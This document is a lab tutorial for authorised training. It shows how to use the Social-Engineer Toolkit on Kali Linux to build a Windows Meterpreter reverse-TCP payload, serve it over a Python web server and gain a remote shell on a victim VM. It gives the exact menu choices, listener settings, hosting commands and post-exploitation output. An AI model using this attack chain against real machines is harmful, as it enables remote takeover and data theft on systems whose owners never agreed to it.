# Hands-on: Social Engineering Toolkit (SET)

A step-by-step lab demonstrating how to use the **Social-Engineer Toolkit (SET)** on Kali Linux to generate a Windows payload, host it, and receive a **Meterpreter** session through **Metasploit**, between an attacker VM and a victim VM.

> ⚠️ **For authorised training and educational use only.** Everything below is performed in an isolated lab between virtual machines you own. Deploying payloads against systems you do not own or lack explicit written permission to test is illegal.

## Lab Environment

| Role | Machine | IP (example) |
| --- | --- | --- |
| Attacker | Kali Linux (VMware) | `192.168.40.129` |
| Victim | Windows 10 x64 (VMware) | `192.168.40.131` |

## Prerequisites

- Kali Linux with SET and Metasploit installed
- A Windows VM on the same host-only / NAT network
- Both machines able to reach each other (verify with `ping`)

---

## 1. Launching SET

Open the Kali application menu, search for `set`, and select **social engineering toolkit (root)**.

![Launching SET from the Kali menu](images/01-launch-set.png)

SET loads and shows its banner and main menu. Type a number to select an option — start with **option 1 (Social-Engineering Attacks)**.

![SET main menu](images/02-set-menu.png)

## 2. Selecting the Attack Vector

From the Social-Engineering Attacks menu, choose **option 4 (Create a Payload and Listener)**.

![Social-Engineering Attacks menu](images/03-attack-menu.png)

SET lists the available payloads. Choose one — for example **option 5 (Windows Meterpreter Reverse_TCP X64)** — then, when prompted for `LHOST`, enter the attacker's IP address.

```text
set:payloads> 5
set:payloads> IP address for the payload listener (LHOST): 192.168.40.129
```

![Payload list and LHOST prompt](images/04-payload-list.png)

## 3. Setting the Port and Generating the Payload

Enter a port for the reverse listener (a random port, for example `1001`). SET generates the payload and exports it to the default SET directory. Listing the directory confirms `payload.exe` is present.

```text
set:payloads> Enter the PORT for the reverse listener: 1001
[*] Payload has been exported to the default SET directory located under: /root/.set/payload.exe
```

![Payload generated in /root/.set](images/05-payload-generated.png)

## 4. Hosting the Payload

Set up a simple web server from the SET directory so the victim can download the payload:

```bash
cd /root/.set
python3 -m http.server 80
```

![Simple HTTP server hosting the payload](images/06-http-server.png)

Type `yes` to start the payload and listener. Metasploit launches and configures the `multi/handler` with the matching payload, `LHOST`, and `LPORT`; the handler then waits for a connection from the victim machine.

![Metasploit handler waiting for a connection](images/07-handler-waiting.png)

## 5. The Victim Downloads the Payload

Switch to the victim machine. In its browser, enter the attacker's IP address to reach the hosted directory listing, then download `payload.exe` — representing the victim clicking a malicious link.

![Victim browsing the directory listing](images/08-victim-download.png)

## 6. Receiving the Meterpreter Session

When the payload runs, the handler receives the connection and a **Meterpreter session** opens.

![Meterpreter session opened](images/09-session-opened.png)

Several sessions may open, but only one is needed. Interact with a session using:

```text
sessions -i 1
```

![Interacting with a session](images/10-sessions-interact.png)

## 7. Post-Exploitation

With the session established, commands can be run on the victim machine. Use `sysinfo` to learn the OS and system details:

```text
meterpreter > sysinfo
Computer        : DESKTOP-VO5Q4NI
OS              : Windows 10 (10.0 Build 19045).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

![sysinfo output](images/11-sysinfo.png)

Drop into a native shell to run standard Windows commands, for example listing the Downloads folder:

```text
meterpreter > shell
C:\Users\freef\Downloads> dir
```

![Native Windows shell listing the Downloads folder](images/12-shell-dir.png)

---

## Key Takeaways

- SET automates payload creation and listener setup, lowering the barrier to a working attack chain.
- Delivery still relies on **social engineering** — the victim has to be persuaded to download and run the file.
- Defensive lessons: don't run untrusted executables, watch for unexpected outbound connections, and use endpoint protection and network monitoring.

## Disclaimer

This material is provided strictly for learning and authorised testing. The author accepts no liability for misuse. Always obtain explicit permission before testing any system.
